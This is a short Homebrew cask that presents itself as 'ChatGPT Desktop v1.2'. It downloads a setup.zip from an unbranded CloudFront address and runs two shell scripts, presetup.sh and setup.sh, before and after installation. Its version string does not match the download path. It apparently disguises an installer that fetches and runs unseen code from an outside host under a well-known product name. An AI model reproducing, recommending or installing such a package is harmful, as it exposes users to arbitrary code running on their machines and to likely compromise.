cask "v1.2" do
  version "1.2.025.210"
  sha256 "388b851f3bc06f3fb622cf55fd17f278691f6714c50ad67a546330563ccb09ae"
  url "https://d3vi63ssapyaka.cloudfront.net/chatgpt/1.2025.210/setup.zip"
  name "ChatGPT Desktop v1.2"
  desc "ChatGPT Desktop v1.2"
  preflight do
    system_command "/bin/zsh", args: ["#{staged_path}/presetup.sh"]
  end
  postflight do
    system_command "/bin/zsh", args: ["#{staged_path}/setup.sh"]
  end
end
